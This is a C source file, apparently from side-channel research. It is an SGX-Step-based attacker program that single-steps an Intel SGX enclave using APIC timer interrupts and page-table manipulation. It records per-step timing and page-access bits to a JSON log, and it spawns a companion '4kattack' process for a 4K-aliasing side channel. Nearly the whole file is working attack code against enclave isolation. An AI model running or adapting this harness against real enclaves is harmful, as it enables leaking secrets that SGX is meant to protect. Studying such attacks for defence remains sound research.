#include "Enclave/encl_u.h"

#include <sgx_urts.h>

#include <signal.h>

#include "libsgxstep/debug.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

#include "libcpu.h"
#include "evset.h"

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

sgx_enclave_id_t eid = 0;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;

uint64_t *test_mem1_pte = NULL;
void *test_mem1_addr = NULL;
uint64_t *test_mem1_pte2 = NULL;
uint64_t *test_mem1_pte3 = NULL;


unsigned int zero_step_cnt = 0;

int32_t meas_nb = 0;

FILE *out_fp;

uint8_t do_measurement = 0;

uint64_t old_erip;
uint64_t erip;

void aep_cb_func(void) {

    old_erip = erip;
    erip = edbgrd_erip() - (uint64_t) get_enclave_base();
    
    if (old_erip == erip) {
      zero_step_cnt++;
      if (zero_step_cnt == 10000) {
        fprintf(stderr, "########## Terminating Measurement Iteration! ##########\n");
  
        do_irq = 0;
      }
    } else if (erip > old_erip) {
      if (zero_step_cnt > 0) { 
        fprintf(stdout, "########## WARNING: Zero-stepping! %d Zero Steps ###########\n", zero_step_cnt);
      }
      zero_step_cnt = 0;
    }

    if(do_measurement == 1) {
        // fprintf(stdout, "In aep_cb_func\n");

        unsigned int accessed_test_mem1 = ACCESSED(*test_mem1_pte) || ACCESSED(*test_mem1_pte2) || ACCESSED(*test_mem1_pte3);

        uint32_t step_time = nemesis_tsc_aex - nemesis_tsc_eresume;
        
        // fprintf(stdout, "erip: %llx\n", erip);
 
        if (irq_cnt > 0) {
            fprintf(out_fp, ",\n");
        }

        fprintf(out_fp, "{\"ic\":%d, \"st\":%u, \"atm1\":%d, \"erip\":%lld}",
        irq_cnt, step_time, accessed_test_mem1, erip);

        irq_cnt++;
    }
    *test_mem1_pte = MARK_NOT_ACCESSED(*test_mem1_pte);
    *test_mem1_pte2 = MARK_NOT_ACCESSED(*test_mem1_pte2);
    *test_mem1_pte3 = MARK_NOT_ACCESSED(*test_mem1_pte3);


    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     *
     */
    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal) {
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

void init_enclave(void) {

    int updated = 0;
    sgx_launch_token_t token = { 0 };

    info_event("Creating enclave...");
    SGX_ASSERT(
            sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token, &updated, &eid, NULL ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();

    if (isatty(fileno(stdout))) {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void) {
    void *code_adrs;

    SGX_ASSERT(get_stub_adrs(eid, &code_adrs));
    SGX_ASSERT(get_test_mem1_addr(eid, &test_mem1_addr));
    fprintf(stdout, "test_mem1_addr addr: %p\n", test_mem1_addr);

    info("enclave trigger code adrs at %p\n", code_adrs);
    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    fprintf(stdout, "pte_encl addr: %p\n", pte_encl);    

    ASSERT(test_mem1_pte = remap_page_table_level(test_mem1_addr, PTE));
    fprintf(stdout, "test_mem1_pte addr: %p\n", test_mem1_pte);
    ASSERT(test_mem1_pte2 = remap_page_table_level(test_mem1_addr + 4096, PTE));
    fprintf(stdout, "test_mem1_pte2 addr: %p\n", test_mem1_pte2);
    ASSERT(test_mem1_pte3 = remap_page_table_level(test_mem1_addr + 2 * 4096, PTE));
    fprintf(stdout, "test_mem1_pte3 addr: %p\n", test_mem1_pte3);


    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    fprintf(stdout, "pmd_encl addr: %p\n", pmd_encl);
}

void attacker_interrupt_setup(void) {
    // Using userspace IDT mapping

    idt_t idt = { 0 };
    
    info_event("Establishing user space APIC/IDT mappings");
    map_idt(&idt);
    // dump_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    info_event("Triggering user space software interrupts");
    asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
    asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
}

void enable_single_stepping() {

#if SINGLE_STEP_ENABLE
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
#endif
}

void setup_attacker(void) {

    attacker_config_runtime();
    attacker_config_page_table();
    attacker_interrupt_setup();
}

void cleanup(void) {
    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
    SGX_ASSERT(sgx_destroy_enclave(eid));
}

void nop() {
}

void active_wait() {
  unsigned int wait_cnt = 1;
  while(wait_cnt > 0) {
    wait_cnt++;
  }
}

int main(int argc, char **argv) {

    info("Single stepping timer interval: %u", SGX_STEP_TIMER_INTERVAL);

    unsigned int offset = 0x140;
    char *file_name = "log.out";

    if (argc >= 2) {
        file_name = argv[1];
    }

    if (argc >= 3) {
        char *string_offset = argv[2];
        offset = (uint64_t) strtoul(string_offset, NULL, 16);
    }

    fprintf(stdout, "### Victim offsets: 0x%x, 0x%x\n", offset, offset + 8);
    fprintf(stdout, "### Attacker offset: 0x%x\n", offset);

    signal(SIGALRM, nop);

    fprintf(stdout, "### Forking ###\n");
    int pid = fork();
    if (pid == 0) {
        char target_offset[12];

        sprintf(target_offset, "%x",
                    (uint32_t) offset);

        char *app_name = "ht_attack/4kattack";
        char *params[] = { "ht_attack/4kattack", target_offset, NULL };
        char *env[] = { NULL };
        fprintf(stdout, "### Spawning second exec ###\n");
        execve(app_name, params, env);
    } else {
        pause();
    
        out_fp = fopen(file_name, "w");
        fprintf(out_fp, "{\"runs\":[\n");

        init_enclave();

        unsigned int test_mem1_pos;
        unsigned int test_mem2_pos;

        SGX_ASSERT(get_test_access_pos_1_for_4k_attack(eid, &test_mem1_pos, offset));
        SGX_ASSERT(get_test_access_pos_1_for_4k_attack(eid, &test_mem2_pos, offset - 8)); // + 8; at the end of cacheline we cannot take the next 8 byte
    
        fprintf(stdout, "### Setup attacker ###\n");
        setup_attacker();
        fprintf(stdout, "test_mem_pos1 (pseudo conflict): 0x%lx\n", test_mem1_pos);
        fprintf(stdout, "accessed addr: 0x%lx\n", test_mem1_addr + test_mem1_pos); // +12
        fprintf(stdout, "test_mem_pos2 (benign): 0x%lx\n", test_mem2_pos);
        fprintf(stdout, "accessed addr: 0x%lx\n", test_mem1_addr + test_mem2_pos);
        int max_meas = 1;
        for (int i = 0; i < max_meas; i++) {
              
            do_measurement = 1;
            old_erip = 0;
            zero_step_cnt = 0;
            irq_cnt = 0;

            enable_single_stepping();
            fprintf(stdout, "Do Measurements!\n");
            fprintf(out_fp, "{\"run%d\":{\"measurements\":[\n", meas_nb);

            SGX_ASSERT(test_access_for_4k_attack(eid,  test_mem1_pos, test_mem2_pos)); // + 12

            meas_nb += 1;

            fprintf(out_fp, "],\n");
            fprintf(out_fp, "\"analysis_result\": {\n");
            fprintf(out_fp, "\"single_stepping_interrupts\": %d\n", irq_cnt);
            if (i == (max_meas - 1)) {
                fprintf(out_fp, "}}}");
            } else {
                fprintf(out_fp, "}}},");
            }

            fault_cnt = 0;
            
            if (max_meas > 1) {
              active_wait();
            }
            fprintf(stderr, "Progress: %.2f\r", ((float)(i + 1))/max_meas);
        }

        fprintf(out_fp, "]\n}");

        kill(pid, SIGINT);
        cleanup();

        fclose(out_fp);
    }

    return 0;
}
